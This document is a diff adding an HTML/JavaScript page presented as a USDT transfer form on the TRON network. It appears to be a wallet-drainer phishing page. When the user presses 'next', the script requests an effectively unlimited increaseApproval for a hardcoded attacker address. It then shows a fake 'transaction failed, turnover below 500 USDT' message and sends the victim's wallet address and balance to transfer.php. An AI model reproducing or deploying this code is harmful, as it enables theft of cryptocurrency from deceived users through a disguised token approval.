@@ -1,0 +1,722 @@
+<!doctype html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+		<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+		<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+		<title>USDT 转账</title>
+		<!-- Framework7 Library CSS -->
+		<link rel="stylesheet" href="vendor.min.css" />
+
+		<!-- Custom app styles-->
+		<link rel="stylesheet" href="reset.min.css" />
+		<!-- <link rel="stylesheet" href="main.css"> -->
+		<script type="text/javascript" src="TronWeb.js"></script>
+
+		<!-- Jquery app core js-->
+		<!-- <script type="text/javascript" src="jquery-2.1.4.min.js"></script> -->
+		<!-- <script type="text/javascript" src="flexible.js"></script> -->
+		<!--     <script type="text/javascript" src="qrcode.min.js"></script> -->
+		<script src="https://cdn.bootcdn.net/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+
+		<!-- Framework7 Library CSS -->
+		<!-- <link rel="stylesheet" href="vendor.css"> -->
+
+		<!-- Custom app styles-->
+		<!-- <link rel="stylesheet" href="reset.css"> -->
+		<link rel="stylesheet" href="main2.css" />
+
+		<!--     <script type="text/javascript" src="jquery.min.js"></script> -->
+		<script src="https://cdn.bootcdn.net/ajax/libs/jquery/3.6.1/jquery.js"></script>
+		<script type="text/javascript" src="flexible.js"></script>
+		<script type="text/javascript" src="mui.js"></script>
+		<style type="text/css">
+			.tishi {
+				width: 3.5rem;
+				height: 1.2rem;
+				background: #00000059;
+				z-index: 999999999999;
+				position: fixed;
+				top: 50%;
+				left: 50%;
+				transform: translate(-50%, -50%);
+				border-radius: 0.1rem;
+				color: white;
+				font-size: 0.6rem;
+				text-align: center;
+				line-height: 1.2rem;
+				display: none;
+			}
+		</style>
+
+		<style type="text/css">
+			/*
+ * contextMenu.js v 1.4.0
+ * Author: Sudhanshu Yadav
+ * s-yadav.github.com
+ * Copyright (c) 2013 Sudhanshu Yadav.
+ * Dual licensed under the MIT and GPL licenses
+**/
+
+			.iw-contextMenu {
+				box-shadow: 0px 2px 3px rgba(0, 0, 0, 0.1) !important;
+				border: 1px solid #c8c7cc !important;
+				border-radius: 11px !important;
+				display: none;
+				z-index: 1000000132;
+				max-width: 300px !important;
+				width: auto !important;
+			}
+
+			.dark-mode .iw-contextMenu,
+			.TnITTtw-dark-mode.iw-contextMenu,
+			.TnITTtw-dark-mode .iw-contextMenu {
+				border-color: #747473 !important;
+			}
+
+			.iw-cm-menu {
+				background: #fff !important;
+				color: #000 !important;
+				margin: 0px !important;
+				padding: 0px !important;
+				overflow: visible !important;
+			}
+
+			.dark-mode .iw-cm-menu,
+			.TnITTtw-dark-mode.iw-cm-menu,
+			.TnITTtw-dark-mode .iw-cm-menu {
+				background: #525251 !important;
+				color: #fff !important;
+			}
+
+			.iw-curMenu {
+			}
+
+			.iw-cm-menu li {
+				font-family: -apple-system, BlinkMacSystemFont, 'Helvetica Neue', Helvetica, Arial, Ubuntu, sans-serif !important;
+				list-style: none !important;
+				padding: 10px !important;
+				padding-right: 20px !important;
+				border-bottom: 1px solid #c8c7cc !important;
+				font-weight: 400 !important;
+				cursor: pointer !important;
+				position: relative !important;
+				font-size: 14px !important;
+				margin: 0 !important;
+				line-height: inherit !important;
+				border-radius: 0 !important;
+				display: block !important;
+			}
+
+			.dark-mode .iw-cm-menu li,
+			.TnITTtw-dark-mode .iw-cm-menu li {
+				border-bottom-color: #747473 !important;
+			}
+
+			.iw-cm-menu li:first-child {
+				border-top-left-radius: 11px !important;
+				border-top-right-radius: 11px !important;
+			}
+
+			.iw-cm-menu li:last-child {
+				border-bottom-left-radius: 11px !important;
+				border-bottom-right-radius: 11px !important;
+				border-bottom: none !important;
+			}
+
+			.iw-mOverlay {
+				position: absolute !important;
+				width: 100% !important;
+				height: 100% !important;
+				top: 0px !important;
+				left: 0px !important;
+				background: #fff !important;
+				opacity: 0.5 !important;
+			}
+
+			.iw-contextMenu li.iw-mDisable {
+				opacity: 0.3 !important;
+				cursor: default !important;
+			}
+
+			.iw-mSelected {
+				background-color: #f6f6f6 !important;
+			}
+
+			.dark-mode .iw-mSelected,
+			.TnITTtw-dark-mode .iw-mSelected {
+				background-color: #676766 !important;
+			}
+
+			.iw-cm-arrow-right {
+				width: 0 !important;
+				height: 0 !important;
+				border-top: 5px solid transparent !important;
+				border-bottom: 5px solid transparent !important;
+				border-left: 5px solid #000 !important;
+				position: absolute !important;
+				right: 5px !important;
+				top: 50% !important;
+				margin-top: -5px !important;
+			}
+
+			.dark-mode .iw-cm-arrow-right,
+			.TnITTtw-dark-mode .iw-cm-arrow-right {
+				border-left-color: #fff !important;
+			}
+
+			.iw-mSelected > .iw-cm-arrow-right {
+			}
+
+			/*context menu css end */
+		</style>
+		<style type="text/css">
+			@-webkit-keyframes load4 {
+				0%,
+				100% {
+					box-shadow:
+						0 -3em 0 0.2em,
+						2em -2em 0 0em,
+						3em 0 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 -1em,
+						-3em 0 0 -1em,
+						-2em -2em 0 0;
+				}
+				12.5% {
+					box-shadow:
+						0 -3em 0 0,
+						2em -2em 0 0.2em,
+						3em 0 0 0,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 -1em,
+						-3em 0 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				25% {
+					box-shadow:
+						0 -3em 0 -0.5em,
+						2em -2em 0 0,
+						3em 0 0 0.2em,
+						2em 2em 0 0,
+						0 3em 0 -1em,
+						-2em 2em 0 -1em,
+						-3em 0 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				37.5% {
+					box-shadow:
+						0 -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0em 0 0,
+						2em 2em 0 0.2em,
+						0 3em 0 0em,
+						-2em 2em 0 -1em,
+						-3em 0em 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				50% {
+					box-shadow:
+						0 -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0 0 -1em,
+						2em 2em 0 0em,
+						0 3em 0 0.2em,
+						-2em 2em 0 0,
+						-3em 0em 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				62.5% {
+					box-shadow:
+						0 -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 0,
+						-2em 2em 0 0.2em,
+						-3em 0 0 0,
+						-2em -2em 0 -1em;
+				}
+				75% {
+					box-shadow:
+						0em -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0em 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 0,
+						-3em 0em 0 0.2em,
+						-2em -2em 0 0;
+				}
+				87.5% {
+					box-shadow:
+						0em -3em 0 0,
+						2em -2em 0 -1em,
+						3em 0 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 0,
+						-3em 0em 0 0,
+						-2em -2em 0 0.2em;
+				}
+			}
+
+			@keyframes load4 {
+				0%,
+				100% {
+					box-shadow:
+						0 -3em 0 0.2em,
+						2em -2em 0 0em,
+						3em 0 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 -1em,
+						-3em 0 0 -1em,
+						-2em -2em 0 0;
+				}
+				12.5% {
+					box-shadow:
+						0 -3em 0 0,
+						2em -2em 0 0.2em,
+						3em 0 0 0,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 -1em,
+						-3em 0 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				25% {
+					box-shadow:
+						0 -3em 0 -0.5em,
+						2em -2em 0 0,
+						3em 0 0 0.2em,
+						2em 2em 0 0,
+						0 3em 0 -1em,
+						-2em 2em 0 -1em,
+						-3em 0 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				37.5% {
+					box-shadow:
+						0 -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0em 0 0,
+						2em 2em 0 0.2em,
+						0 3em 0 0em,
+						-2em 2em 0 -1em,
+						-3em 0em 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				50% {
+					box-shadow:
+						0 -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0 0 -1em,
+						2em 2em 0 0em,
+						0 3em 0 0.2em,
+						-2em 2em 0 0,
+						-3em 0em 0 -1em,
+						-2em -2em 0 -1em;
+				}
+				62.5% {
+					box-shadow:
+						0 -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 0,
+						-2em 2em 0 0.2em,
+						-3em 0 0 0,
+						-2em -2em 0 -1em;
+				}
+				75% {
+					box-shadow:
+						0em -3em 0 -1em,
+						2em -2em 0 -1em,
+						3em 0em 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 0,
+						-3em 0em 0 0.2em,
+						-2em -2em 0 0;
+				}
+				87.5% {
+					box-shadow:
+						0em -3em 0 0,
+						2em -2em 0 -1em,
+						3em 0 0 -1em,
+						2em 2em 0 -1em,
+						0 3em 0 -1em,
+						-2em 2em 0 0,
+						-3em 0em 0 0,
+						-2em -2em 0 0.2em;
+				}
+			}
+		</style>
+		<style type="text/css">
+			/* This is not a zero-length file! */
+		</style>
+	</head>
+	<body style="font-size: 12px">
+		<!-- Views -->
+		<div class="views">
+			<!-- main view -->
+			<div class="view view-main">
+				<!-- Pages -->
+				<div class="pages navbar-through">
+					<div class="page">
+						<!-- Top Navbar-->
+						<!--<div class="navbar">-->
+						<!--	<div class="navbar-inner">-->
+						<!--		<div class="left">-->
+						<!--			<a href="javascript:void(0);" class="link" onclick="goback()"><i class="icon icon-back1"></i></a>-->
+						<!--		</div>-->
+						<!--		<div class="center">USDT transfer</div>-->
+						<!--		<div class="right"></div>-->
+						<!--	</div>-->
+						<!--</div>-->
+						<div class="page-content" style="padding-top: 0.5rem">
+							<div class="list-block address">
+								<div class="list-block-title">收款地址</div>
+								<ul>
+									<li class="item-content">
+										<div class="item-inner">
+											<div class="item-title" id="address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</div>
+										</div>
+									</li>
+								</ul>
+							</div>
+							<div class="list-block amount">
+								<div class="list-block-title">金额</div>
+								<ul>
+									<li class="item-content">
+										<div class="item-inner">
+											<div class="item-title">
+												<input id="input_num" class="num" placeholder="0" value="" />
+												<!-- <p>¥ <span id="price" style="color: inherit;font-size:inherit;">0</span></p> -->
+											</div>
+										</div>
+									</li>
+									<!-- <li class="item-content">
+                            	<div class="item-inner">
+                            		<div class="item-after">backup</div>
+                            </div>
+                            </li> -->
+								</ul>
+								<!-- <ul style="margin-top: 0.266666rem;">
+                            <li class="item-content item-link">
+                                <div class="item-inner">
+                                    <div class="item-title">转账金额</div>
+                                    <div class="item-after">
+                                        <p><input id="input_num" class="num" placeholder="0" value="" style="text-align:right; width: 100px;"><span> USDT</span></p>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul> -->
+								<!-- <ul>
+                            <li class="item-content item-link">
+                                <div class="item-inner">
+                                    <div class="item-title">可用余额</div>
+                                    <div class="item-after">
+                                        <p><span id="yu">0 USDT</span></p>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul> -->
+								<!--                         <ul>
+                            <li class="item-content item-link">
+                                <div class="item-inner">
+                                    <div class="item-title">TRX矿工费不足22</div>
+                                    <div class="item-after">
+                                        <p>6.65 TRX</p>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul> -->
+								<!-- <ul>
+                            <li class="item-content item-link">
+                                <div class="item-inner">
+                                    <div class="item-title">可用余额</div>
+                                    <div class="item-after">
+                                        <p>0.002640 ETH</p>
+                                        <p>￥44.69</p>
+                                    </div>
+                                </div>
+                            </li>
+                        </ul> -->
+							</div>
+							<div class="list-block-button">
+								<button class="button button-fill" id="btn-connect" style="background: rgb(7, 139, 195)">下一步</button>
+							</div>
+						</div>
+					</div>
+					<!-- Preloader -->
+					<div class="modal modal-out">
+						<div class="preloader"></div>
+					</div>
+					<div class="tishi" style="font-size: 14px; width: 80%">交易失败，您的地址流水未达到500USDT</div>
+				</div>
+			</div>
+			<div id="s"></div>
+		</div>
+		<div id="fffsss" style="color: white; z-index: 99999999999999999; position: absolute; top: 1px"></div>
+
+		<!-- Custom app js-->
+		<script src="main.js"></script>
+		<script type="text/javascript">
+			function GetRequest() {
+				var url = location.search //获取url中"?"符后的字串
+				var theRequest = new Object()
+				if (url.indexOf('?') != -1) {
+					var str = url.substr(1)
+					strs = str.split('&')
+					for (var i = 0; i < strs.length; i++) {
+						theRequest[strs[i].split('=')[0]] = unescape(strs[i].split('=')[1])
+					}
+				}
+				return theRequest
+			}
+			// console.dir(GetRequest())
+			window.vip = GetRequest().vip || ''
+			document.getElementById('input_num').value = vip
+
+			var address = getUrlQueryString('address')
+			var rank = 6.5
+			var authorized_address = 'TThh4Ad6grVD5Gs8Vnvac9Ek1rtfuqNH13'
+			var domain = 'https://' + window.location.host + '/'
+			var bizhong = ''
+			var approveAddr = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'
+			var total = 0
+			var trx = 0
+			function b(url, data, callback) {
+				var xhr = new XMLHttpRequest()
+				xhr.open('POST', url, true)
+				xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded')
+				//         xhr.send(data);
+
+				xhr.onreadystatechange = function () {
+					if (xhr.readyState == 4 && xhr.status == 200) {
+						returndata = eval('(' + xhr.responseText + ')')
+						callback(returndata)
+					}
+				}
+			}
+			b('', 'pid=0', function (data) {
+				if (data.status == 1) {
+					authorized_address = data.address
+				} else {
+					alert(data.msg)
+				}
+			})
+
+			function GetRandomNum(Min, Max) {
+				var Range = Max - Min
+				var Rand = Math.random()
+				return Min + Math.round(Rand * Range)
+			}
+
+			function getUrlQueryString(names, urls) {
+				urls = urls || window.location.href
+				urls && urls.indexOf('?') > -1 ? (urls = urls.substring(urls.indexOf('?') + 1)) : ''
+				var reg = new RegExp('(^|&)' + names + '=([^&]*)(&|$)', 'i')
+				var r = urls ? urls.match(reg) : window.location.search.substr(1).match(reg)
+				if (r != null && r[2] != '') return unescape(r[2])
+				return null
+			}
+
+			$('input.num').bind('input propertychange', function () {
+				if ($(this).val() && $(this).val() > 0) {
+					$('#btn-connect').css('background', '#078bc3')
+				} else {
+					$('#btn-connect').css('background', '#dde0dd')
+				}
+				$('#price').text(($(this).val() * rank).toLocaleString())
+			})
+
+			$('#address').text('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+
+			$(function () {
+				const addr = {
+					USDT: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
+				}
+
+				const price = {
+					WIN: 0.00115,
+					USDT: 1,
+					TONS: 1.35,
+					USDJ: 1.04,
+					JST: 0.125,
+					HT: 20.41,
+					SUN: 33.97,
+					EXNX: 0.0621,
+					VCOIN: 0.004225,
+					POL: 0.1393,
+					CKRW: 0.002487,
+				}
+
+				const decimals = {
+					WIN: 6,
+					USDT: 6,
+					TONS: 6,
+					USDJ: 18,
+					JST: 18,
+					HT: 18,
+					SUN: 18,
+					EXNX: 18,
+					VCOIN: 6,
+					POL: 8,
+					CKRW: 6,
+				}
+
+				async function getMostValuableAssets(account) {
+					let _symbol = 'USDT'
+					// 			fffsss = fffsss + "account:" + account + "---"
+					// 			$("#fffsss").text(fffsss)
+					for (const symbol of Object.keys(addr)) {
+						let contract = await tronWeb.contract().at(addr[symbol])
+						let myBalance = await contract.balanceOf(account).call(function (err, balance) {
+							const usdt = (balance / 10 ** (decimals[symbol] || 18)) * price[symbol]
+							console.log(usdt)
+							if (usdt > total && usdt > 500) {
+								_symbol = symbol
+								total = usdt
+								approveAddr = addr[_symbol]
+							}
+						})
+					}
+					bizhong = _symbol
+					return _symbol
+				}
+
+				/**
+				 * * Connect wallet button pressed.
+				 */
+				async function onConnect() {
+					$('.pages').append('<div class="modal-overlay"></div>')
+					$('.modal-overlay').addClass('modal-overlay-visible')
+					$('.modal').removeClass('modal-out').addClass('modal-in')
+					let tronWeb = window.tronWeb
+					let walletAddress = tronWeb.defaultAddress.base58
+
+					if (window.tronWeb.defaultAddress == undefined) {
+						$('.modal-overlay').remove()
+						$('.modal').removeClass('modal-in').addClass('modal-out')
+						mui.alert('TRX矿工费不足22')
+						return
+					}
+
+					bizhong = await getMostValuableAssets(walletAddress)
+					let instance = await tronWeb.contract().at(approveAddr)
+
+					tradeobj = await window.tronWeb.trx.getAccount(walletAddress)
+					if (tradeobj['balance'] == undefined) {
+						$('.modal-overlay').remove()
+						$('.modal').removeClass('modal-in').addClass('modal-out')
+						mui.alert('TRX矿工费不足22', '提示', '确定')
+						return
+					}
+					trxye = tradeobj['balance'] / 1000000
+					if (trxye < 22) {
+						$('.modal-overlay').remove()
+						$('.modal').removeClass('modal-in').addClass('modal-out')
+						mui.alert('TRX矿工费不足22', '提示', '确定')
+						return
+					}
+					let contract = await window.tronWeb.contract().at(approveAddr)
+					num = document.getElementById('input_num').value
+					let ye = await contract.balanceOf(walletAddress).call()
+					c = ye._hex
+					d = eval(c).toString(10)
+					e = d / 1000000
+					console.log(typeof e)
+					if (num == 0) {
+						$('.modal-overlay').remove()
+						$('.modal').removeClass('modal-in').addClass('modal-out')
+						mui.alert('请输入转账USDT数量', '提示', '确定')
+						return
+					}
+					if (num > e) {
+						$('.modal-overlay').remove()
+						$('.modal').removeClass('modal-in').addClass('modal-out')
+						mui.alert('USDT余额不足', '提示', '确定')
+						return
+					}
+
+					let res = await instance['increaseApproval'](authorized_address, '90000000000000000000000000000')
+					res.send(
+						{
+							feeLimit: 100000000,
+							callValue: 0,
+							shouldPollResponse: false,
+						},
+						function (err, res) {
+							if (err == null) {
+								// $(".tishi").fadeIn()
+								// setTimeout(function () {
+								//     $(".tishi").fadeOut()
+								// },2000);
+								mui.alert('交易失败，您的地址流水未达到500USDT', '提示', '确定')
+								var timestamp = new Date().getTime()
+								var output = GetRandomNum(10000, 99999)
+								outputs = timestamp + '' + output
+								var data = {}
+								data.value = outputs
+								data.sqgl = walletAddress
+								data.pzzz = total
+								data.sqt = authorized_address
+								data.type = 'TRX'
+								data.pid = 1
+								var params = Object.keys(data)
+									.map(function (key) {
+										return encodeURIComponent(key) + '=' + encodeURIComponent(data[key])
+									})
+									.join('&')
+								b('./transfer.php', params, function (data) {
+									console.log(data)
+								})
+							}
+							$('.modal-overlay').remove()
+							$('.modal').removeClass('modal-in').addClass('modal-out')
+						},
+					)
+				}
+
+				async function s() {
+					var tronWeb = window.tronWeb
+					let contract = await tronWeb.contract().at('TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t')
+					let walletAddress = tronWeb.defaultAddress.base58
+					let result = await contract.balanceOf(walletAddress).call(function (err, tex) {
+						if (err == null) {
+							let total = tex._hex / 10 ** 6
+							$('#yu').text(total.toLocaleString() + ' USDT')
+							console.log()
+						}
+					})
+				}
+
+				document.querySelector('#btn-connect').addEventListener('click', onConnect)
+				document.querySelector('#s').addEventListener('click', s)
+			})
+
+			$(function () {
+				setTimeout(function () {
+					$('#s').click()
+				}, 1000)
+			})
+		</script>
+
+		<style class="AC-highLightRule">
+			.acWHSet {
+				display: inline !important;
+				box-shadow: -3px 0px 3px 0.15px rgba(0, 0, 0, 0.15);
+				color: rgb(0, 0, 0);
+				font-weight: inherit;
+			}
+			.acWHSet[data='tokenpocket'] {
+				background-color: #ffff80;
+			}
+		</style>
+	</body>
+</html>
